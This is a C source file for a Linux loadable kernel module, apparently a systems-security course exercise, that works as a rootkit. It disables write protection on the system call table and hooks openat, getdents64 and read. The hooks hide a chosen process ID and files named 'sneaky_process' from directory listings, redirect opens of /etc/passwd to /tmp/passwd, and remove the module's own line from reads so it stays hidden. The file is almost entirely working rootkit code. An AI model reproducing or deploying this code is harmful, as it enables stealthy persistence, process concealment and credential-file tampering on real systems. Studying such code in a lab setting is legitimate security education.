#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/dirent.h>
#define PREFIX "sneaky_process"

//This is a pointer to the system call table
static unsigned long *sys_call_table;

static char * sneaky_pid = "";
module_param(sneaky_pid, charp, 0);
MODULE_PARM_DESC(pid, "sneaky_pid");
// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);
asmlinkage int (*original_getdents64)(struct pt_regs *);
asmlinkage ssize_t (*original_read)(struct pt_regs *);
// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  // Implement the sneaky part here
  const char *pathname = (const char *)regs->si;
  if(strcmp(pathname,"/etc/passwd")==0){
    copy_to_user((void *)pathname,"/tmp/passwd", 12);
  }
  return (*original_openat)(regs);
}

asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
{
  // Implement the sneaky part here
  
  struct linux_dirent64 __user *dirp = (struct linux_dirent64 *)regs->si;
  int res = original_getdents64(regs);
  size_t len = 0;
  size_t tlen = 0;
  if (res == 0 ||res == -1){
    return res;}
  tlen = res;
  while (tlen>0) {
    // printk("current dir: %s\n",dirp->d_name);
    len = dirp->d_reclen;
    tlen -= len;
    if (!memcmp(dirp->d_name, sneaky_pid,strlen(sneaky_pid)) || !memcmp(dirp->d_name, PREFIX,strlen(PREFIX))){
      memmove(dirp, (char *)dirp + dirp->d_reclen, tlen);
      // printk("hide %s\n",dirp->d_name);
      res -= len;
    }
    if (tlen){
      dirp = (struct linux_dirent64 *)((char *)dirp + dirp->d_reclen);
      }
  }
    
  return res;
}

asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs)
{
  ssize_t res = original_read(regs);
  // // Implement the sneaky part here
  void *buf = (void *)regs->si;
  if(res == -1 || res == 0){
    return res;
  }
  void * start = strstr(buf, "sneaky_mod ");
  void * end;
  if (start != NULL){
    end = strchr(start, '\n');
    if(end != NULL){
      memmove(start, end+1, (buf + res) - (end+1));
      res -= (ssize_t)(end - start);
    }
  }

  return res;
}


// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  original_read = (void *)sys_call_table[__NR_read];
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;

  // You need to replace other system calls you need to hack here
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");